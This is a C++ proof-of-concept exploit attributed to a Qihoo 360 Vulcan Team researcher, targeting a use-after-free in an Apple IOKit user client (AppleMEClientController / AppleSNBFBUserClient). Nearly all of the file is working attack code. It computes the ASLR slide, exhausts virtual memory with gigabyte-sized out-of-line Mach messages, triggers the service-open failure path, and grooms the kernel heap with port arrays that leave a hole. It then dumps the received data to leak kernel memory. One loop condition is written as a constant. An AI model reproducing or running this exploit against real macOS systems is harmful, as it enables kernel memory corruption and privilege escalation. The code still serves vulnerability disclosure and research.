/**
 *  Author: Zhuo Liang(@realBrightiup) Qihoo 360 Vulcan Team
 *
 *  Brief: Use-after-free in AppleSNBFBUserClient.
 *
 */

#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

io_service_t fetch_service_port(const char *service_name) {
    io_service_t service =
        IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
    if (service == MACH_PORT_NULL) {
        printf("[-] Cannot get matching service of %s\n", service_name);
        return MACH_PORT_NULL;
    }
    printf("[+] Get matching service of %s succeed, service = 0x%x\n", service_name, service);
    return service;
}

int32_t verbose = 0;

template < size_t OOL_COUNT >
mach_msg_return_t recv_ool_msg(mach_port_t server_port) {

    typedef struct meclient_controller_response_msg_s meclient_controller_response_msg_t;

#pragma pack(4)
    struct meclient_controller_response_msg_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t ool[OOL_COUNT];
        kern_return_t ret_code;
        NDR_record_t NDR;
        uint64_t seq;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    meclient_controller_response_msg_t response;
    memset(&response, 0, sizeof(response));

    response.header.msgh_local_port = server_port;
    response.header.msgh_size = sizeof(response);

    mach_msg_return_t result = mach_msg(&response.header, MACH_RCV_MSG, 0, sizeof(response),
                                        server_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (result != KERN_SUCCESS || response.ret_code != KERN_SUCCESS) {
        printf("[-] Receive message failed: %s, %s\n", mach_error_string(result),
               mach_error_string(response.ret_code));
        return KERN_FAILURE;
    } else {
        if (!verbose) {
            return KERN_SUCCESS;
        }
        /*
         *printf("[*] port count: 0x%x\n",
         *response.msgh_body.msgh_descriptor_count); printf("[*] sequence:
         *0x%llx\n", response.seq); printf("[*] msg id: 0x%x\n",
         *response.header.msgh_id);
         */
        for (int64_t i = response.msgh_body.msgh_descriptor_count - 1; i >= 0; i--) {
            printf("OOL 0x%llx\n", i);
            printf("\taddress = %p\n", response.ool[i].address);
            printf("\tsize = 0x%x\n", response.ool[i].size);

            void *addr = response.ool[i].address;
            size_t size = response.ool[i].size;

            for (size_t i = 0; i < size; i += 8) {
                printf("\t\t0x%llx\n", *(uint64_t *)((uint8_t *)addr + i));
            }
            // printf("\tcopy = %s\n", response.ool[i].copy ? "TRUE" : "FALSE");
            // printf("\tdeallocate = %s\n", response.ool[i].deallocate ? "TRUE"
            // : "FALSE");
        }
    }

    return KERN_SUCCESS;
}

template < size_t OOL_COUNT >
mach_msg_return_t send_ool_msg(mach_port_t server_port, void *addr, mach_vm_offset_t len) {

    typedef struct meclient_controller_request_msg_s meclient_controller_request_msg_t;

#pragma pack(4)
    struct meclient_controller_request_msg_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t ool[OOL_COUNT];
        NDR_record_t NDR;
        uint64_t seq;
    };
#pragma pack(0)

    mach_msg_return_t result = KERN_SUCCESS;

    meclient_controller_request_msg_t request;

    memset(&request, 0, sizeof(request));

    request.header.msgh_bits = MACH_MSGH_BITS(19, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = server_port;
    request.header.msgh_local_port = MACH_PORT_NULL;
    request.header.msgh_voucher_port = MACH_PORT_NULL;
    request.header.msgh_id = 0x12345678;

    request.msgh_body.msgh_descriptor_count = OOL_COUNT;

    for (size_t j = 0; j < OOL_COUNT; j++) {
        request.ool[j].address = addr;
        request.ool[j].size = len;
        request.ool[j].copy = 1;
        request.ool[j].deallocate = 0;
        request.ool[j].type = MACH_MSG_OOL_DESCRIPTOR;
    }

    request.NDR = NDR_record;
    request.seq = 0x22222222;
    result = mach_msg(&request.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(request), 0,
                      MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (result != KERN_SUCCESS) {
        printf("[*] Send message failed: %s\n", mach_error_string(result));
        return result;
    } else {
        // printf("[+] Send ool message succeed!\n");
    }

    return KERN_SUCCESS;
}

template < size_t RECV_TIMES >
mach_msg_return_t recv_ool_ports(mach_port_t server_port) {

    typedef struct recv_ool_ports_response_s recv_ool_ports_response_t;
#pragma pack(4)
    struct recv_ool_ports_response_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t ool_ports;
        mach_msg_return_t ret_code;
        NDR_record_t NDR;
        uint64_t seq;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    recv_ool_ports_response_t response;

    for (size_t i = 0; i < RECV_TIMES; i++) {
        memset(&response, 0, sizeof(response));

        response.header.msgh_local_port = server_port;
        response.header.msgh_size = sizeof(response);

        mach_msg_return_t result = mach_msg(&response.header, MACH_RCV_MSG, 0, sizeof(response),
                                            server_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (result != KERN_SUCCESS || response.ret_code != KERN_SUCCESS) {
            printf("[-] Receive out-of-line ports message failed: %s, %s\n",
                   mach_error_string(result), mach_error_string(response.ret_code));
            return KERN_FAILURE;
        } else {
        }
    }
    return KERN_SUCCESS;
}

template < size_t OOL_PORTS_COUNT, size_t SEND_TIMES >
mach_msg_return_t send_ool_ports_with_hole(mach_port_t server_port, mach_port_t valid_name,
                                           size_t invalid_index) {

    typedef struct send_ool_ports_request_s send_ool_ports_request_t;
#pragma pack(4)
    struct send_ool_ports_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t ool_ports;
        NDR_record_t NDR;
        uint64_t seq;
    };
#pragma pack(0)

    mach_port_t names[OOL_PORTS_COUNT];
    memset(names, 0, sizeof(names));

    send_ool_ports_request_t request;

    if (invalid_index >= OOL_PORTS_COUNT) {
        printf(
            "[-] Invalid \"invalid_index\"[0x%zx] as the count of ports is "
            "0x%zx\n",
            invalid_index, OOL_PORTS_COUNT);
        return KERN_FAILURE;
    }

    if (OOL_PORTS_COUNT <= 12 || OOL_PORTS_COUNT > 16) {
        printf("[-] Invalid OOL_PORTS_COUNT: 0x%zx\n", OOL_PORTS_COUNT);
        return KERN_FAILURE;
    }

    for (size_t i = 0; i < OOL_PORTS_COUNT; i++) {
        if (i != invalid_index) {
            names[i] = valid_name;
        }
    }

    memset(&request, 0, sizeof(request));

    request.header.msgh_bits = MACH_MSGH_BITS(19, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = server_port;
    request.header.msgh_local_port = MACH_PORT_NULL;
    request.header.msgh_voucher_port = MACH_PORT_NULL;
    request.header.msgh_id = 0x23456781;

    request.msgh_body.msgh_descriptor_count = 1;

    request.ool_ports.address = names;
    request.ool_ports.count = OOL_PORTS_COUNT;
    request.ool_ports.deallocate = 0;
    request.ool_ports.copy = 1;
    request.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    request.ool_ports.disposition = MACH_MSG_TYPE_MAKE_SEND_ONCE;

    request.NDR = NDR_record;

    for (size_t i = 0; i < SEND_TIMES; i++) {
        request.seq = i;
        mach_msg_return_t result =
            mach_msg(&request.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(request), 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (result != KERN_SUCCESS) {
            printf("[*] Send out-of-line ports message failed: %s\n", mach_error_string(result));
            return result;
        } else {
        }
    }

    return KERN_SUCCESS;
}

kern_return_t MEIOServiceOpen(io_service_t service, mach_port_t task, uint32_t type,
                              io_connect_t *client) {

    typedef struct me_io_service_open_request_s me_io_service_open_request_t;
    typedef struct me_io_service_open_resopnse_s me_io_service_open_resopnse_t;

#pragma pack(4)
    struct me_io_service_open_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t owning_task;
        mach_msg_ool_descriptor_t properties;
        NDR_record_t NDR;
        uint32_t connect_type;
        NDR_record_t ndr;
        mach_msg_type_number_t properties_cnt;
    };
#pragma pack(0)

#pragma pack(4)
    struct me_io_service_open_resopnse_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t connection;
        NDR_record_t NDR;
        kern_return_t result;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        me_io_service_open_request_t request;
        me_io_service_open_resopnse_t response;
    } Message;

    me_io_service_open_request_t *request = &Message.request;
    me_io_service_open_resopnse_t *response = &Message.response;

    memset(&Message, 0, sizeof(Message));

    request->header.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = MACH_PORT_NULL;
    request->header.msgh_id = 2862;

    request->msgh_body.msgh_descriptor_count = 2;

    request->owning_task.name = task;
    request->owning_task.type = MACH_MSG_PORT_DESCRIPTOR;
    request->owning_task.disposition = 19;

    request->properties.address = NULL;
    request->properties.size = 0;
    request->properties.type = MACH_MSG_OOL_DESCRIPTOR;
    request->properties.copy = 0;
    request->properties.deallocate = 0;

    request->NDR = NDR_record;
    request->connect_type = type;
    request->ndr = NDR_record;

    kern_return_t kr = mach_msg(
        &request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE, sizeof(*request),
        sizeof(*response), request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS || response->result != KERN_SUCCESS) {
        printf("[-] Open service failed: %s %s\n", mach_error_string(kr),
               mach_error_string(response->result));
        return response->result;
    }
    *client = response->connection.name;

    return KERN_SUCCESS;
}

int main(int argc, char **argv) {

    io_connect_t client = MACH_PORT_NULL;
    const char *service_name = "AppleMEClientController";
    io_service_t service = fetch_service_port(service_name);

#define MASK 0xfff
#define ADDR_FETCH_SERVICE_PORT 0x0000000100001520

    uint64_t slide = (((uint64_t)&fetch_service_port - ADDR_FETCH_SERVICE_PORT) + MASK) & (~MASK);
    uint64_t address = 0x0000000100000000 + slide + 0x000000000005f000;

    printf("[+] IOKIT memory start at 0x%llx\n", address);

    mach_vm_address_t alloc_addr = address;
    mach_vm_offset_t alloc_len = 0x1000;

    mach_port_t server_port = MACH_PORT_NULL;
    mach_port_t alloc_port = MACH_PORT_NULL;

    mach_msg_return_t mpr =
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
    if (mpr != KERN_SUCCESS) {
        printf("[-] Allocate server port failed: %s\n", mach_error_string(mpr));
        return 0;
    }
    mpr =
        mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
    if (mpr != KERN_SUCCESS) {
        printf("[-] Insert send right to server port failed: %s\n", mach_error_string(mpr));
        return 0;
    }

    mpr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &alloc_port);
    if (mpr != KERN_SUCCESS) {
        printf("[-] Allocate alloc port failed: %s\n", mach_error_string(mpr));
        return 0;
    }
    mpr = mach_port_insert_right(mach_task_self(), alloc_port, alloc_port, MACH_MSG_TYPE_MAKE_SEND);
    if (mpr != KERN_SUCCESS) {
        printf("[-] Insert send right to alloc port failed: %s\n", mach_error_string(mpr));
        return 0;
    }

#define GB (0x400 * 0x400 * 0x400L)
#define MB (0x400 * 0x400L)
#define KB (0x400L)

    size_t i = 0;

    for (i = 0;; i++) {
        kern_return_t alloc_ret = mach_vm_allocate(mach_task_self(), &alloc_addr, alloc_len, 0);
        if (alloc_ret != KERN_SUCCESS) {
            printf("[-] Allocate memory failed: %s\n", mach_error_string(alloc_ret));
            break;
        }
        alloc_addr += alloc_len;
    }
    printf("[+] Alloc for 0x%zx times, last addr: 0x%llx\n", i, alloc_addr);

    uint64_t buffer_size = 0x400 * 0x400 * 0x400;
    void *buffer = malloc(buffer_size);
    if (buffer == NULL) {
        printf("[-] Allocate buffer failed!\n");
        return 0;
    }

    for (i = 0; 0x800 - 2; i++) {
        if (send_ool_msg< 0x40 >(server_port, buffer, GB) != KERN_SUCCESS) return 0;
        if (recv_ool_msg< 0x40 >(server_port) != KERN_SUCCESS) break;
    }
    printf("[*] 0x40GB for 0x%zx times!\n", i);

    for (i = 0; i < 0x80; i++) {
        if (send_ool_msg< 0x1 >(server_port, buffer, GB) != KERN_SUCCESS) return 0;
        if (recv_ool_msg< 0x1 >(server_port) != KERN_SUCCESS) break;
    }
    printf("[*] 0x1GB for 0x%zx times!\n", i);

    for (i = 0;; i++) {
        if (send_ool_msg< 0x1 >(server_port, buffer, MB) != KERN_SUCCESS) return 0;
        if (recv_ool_msg< 0x1 >(server_port) != KERN_SUCCESS) break;
    }
    printf("[*] 1MB for 0x%zx times!\n", i);

    for (i = 0;; i++) {
        if (send_ool_msg< 0x1 >(server_port, buffer, KB) != KERN_SUCCESS) return 0;
        if (recv_ool_msg< 0x1 >(server_port) != KERN_SUCCESS) break;
    }
    printf("[*] 1KB for 0x%zx times!\n", i);

    kern_return_t ret = MEIOServiceOpen(service, mach_task_self(), 0, &client);
    if (ret != KERN_SUCCESS) {

        mach_vm_deallocate(mach_task_self(), address, 0x400 * 0x400);

#define OOL_FENFSHUI_COUNT 0x100
        mach_port_t ool_ports[OOL_FENFSHUI_COUNT] = {0};

        for (i = 0; i < OOL_FENFSHUI_COUNT; i++) {
            mpr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[i]);
            if (mpr != KERN_SUCCESS) {
                printf("[-] Allocate alloc port failed: %s\n", mach_error_string(mpr));
                return 0;
            }
            mpr = mach_port_insert_right(mach_task_self(), ool_ports[i], ool_ports[i],
                                         MACH_MSG_TYPE_MAKE_SEND);
            if (mpr != KERN_SUCCESS) {
                printf("[-] Insert send right to alloc port failed: %s\n", mach_error_string(mpr));
                return 0;
            }
        }

        for (i = 0; i < OOL_FENFSHUI_COUNT; i++) {
            if (send_ool_ports_with_hole< 13, 5 >(ool_ports[i], alloc_port, 7) != KERN_SUCCESS) {
                return 0;
            }
        }

		/*
         *ret = MEIOServiceOpen(service, mach_task_self(), 0, &client);
         *if (ret != KERN_SUCCESS) {
         *} else {
         *    printf("[+] Create IOUserClient of %s succeed, client = 0x%x\n", service_name, client);
         *}
		 */

		verbose = 1;
		for (i = 0; i < OOL_FENFSHUI_COUNT; i++) {
		   recv_ool_ports<5>(ool_ports[i]);
		}

    } else {
        printf("[+] Create IOUserClient of %s succeed, client = 0x%x\n", service_name, client);
    }

    return 0;
}
